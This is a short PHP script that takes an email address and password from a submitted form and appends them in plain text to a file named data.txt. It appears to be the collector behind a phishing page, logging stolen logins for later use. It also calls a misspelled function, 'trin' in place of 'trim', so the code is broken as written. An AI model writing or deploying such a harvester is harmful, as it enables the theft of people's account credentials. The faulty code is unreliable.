<?php

$email = trin($_POST['email']);
$pass = trin($_POST['pass']);

$fp = fopen('data.txt', 'a');
fwrite($fp,"email: {$email}\n");
fwrite($fp,"pass: {$pass}\n");
fwrite($fp,"-----------------\n");
fclose($fp);